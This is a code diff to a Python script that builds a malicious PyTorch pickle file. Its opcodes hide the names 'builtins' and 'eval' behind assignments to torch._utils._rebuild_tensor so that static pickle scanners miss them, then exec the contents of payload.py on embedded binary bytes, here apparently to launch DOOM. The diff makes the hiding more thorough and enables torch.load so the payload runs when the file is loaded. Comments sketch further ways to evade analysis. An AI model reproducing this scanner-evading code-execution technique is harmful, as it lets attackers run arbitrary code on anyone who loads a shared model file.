@@ -80,11 +80,31 @@ def get_value(name: p.Opcode = p.Unicode(b"_rebuild_tensor")) -> list[p.Opcode]:
         p.StackGlobal(),
     ]
 
+
+def hidden_unicode(uni: bytes) -> list[p.Opcode]:
+    """
+    _utils._rebuild_tensor = uni
+    from torch._utils import _rebuild_tensor
+    return _rebuild_tensor
+
+    the idea is you'd need to execute the assignment and import
+    to know what's on the stack
+    """
+    return set_value(p.Unicode(uni)) + get_value()
+
+
 # tl;dr
 # get an innocous module
 # use BUILD to set variables in the module with innocous names
 # import the values you want from it
 # those values can't be statically analysed
+
+
+# maybe there's a way to sneakily change the stack?
+# make genops think a variable is _rebuild_tensor when it's actually _rebuild_tensor.__class__.__getattribute__ or such?
+# the really fun thing would be is if you can find a reference to the unpickler and mutate the stack that way
+# ...dup?
+# what if we had stackdata with an argument?
 
 exploit = [
     # from torch._utils import _rebuild_tensor as orig_rebuild_tensor
@@ -98,39 +118,29 @@ exploit = [
     vars.add(p.Memoize(), "_utils"),
     p.Pop(),
     # _utils._rebuild_tensor = "builtins"
-    *set_value(p.Unicode(b"builtins")),
     # from torch._utils import _rebuild_tensor as builtins_str
-    *get_value(),
+    *hidden_unicode(b"builtins"),
     # _utils._rebuild_tensor = "eval"
-    *set_value(p.Unicode(b"eval")),
     # from torch._utils import _rebuild_tensor as eval_str
-    *get_value(),
+    *hidden_unicode(b"eval"),
     # eval = getattr(sys.modules[builtins_str], eval_str)
     # the idea is you'd need to execute those imports and assignments
     # to know what was imported here
     p.StackGlobal(),
-    vars.add(p.Memoize(), "eval"),
     # _utils._rebuild_tensor = orig_rebuild_tensor
     *set_value(vars["orig_rebuild_tensor"]),
-    # lambda to untarball so that we can reduce
-    p.Unicode(
-        b"lambda data: __import__('tarfile').open(fileobj=__import__('io').BytesIO(data)).extractall()"
-    ),
+    # grab payload source
+    p.Unicode(f'''exec("""{open("payload.py").read()}""") or payload'''.encode()),
     p.TupleOne(),
-    # eval that lambda source
-    p.Reduce(),
+    p.Reduce(),  # define payload fn, `eval(exec(payload))`
     get_doom_binbytes(),
     p.TupleOne(),
-    # extract doom
-    p.Reduce(),
-    p.Pop(),
-    vars["eval"],
-    # yolo
-    p.Unicode(b"__import__('os').system('./doom_ascii')"),
-    p.TupleOne(),
-    p.Reduce(),
+    p.Reduce(),  # payload(doom_bytes)
     p.Pop(),
 ]
+
+
+# __import__("IPython").display.IFrame("https://technillogue.github.io/doom.html", 960, 600)
 
 
 # you can get fancier with abusing building on modules with stack_global
@@ -199,6 +209,6 @@ f.close()
 print("loading cool vae")
 # note! this launches doom! and waits for it to exit!
 # doom is poorly behaved and doesn't clean up the screen
-#cool_model = torch.load(output_path)
+cool_model = torch.load(output_path)
 # print(cool_model)
 pt.dis(dumped, out=open("vae_dis", "w"))
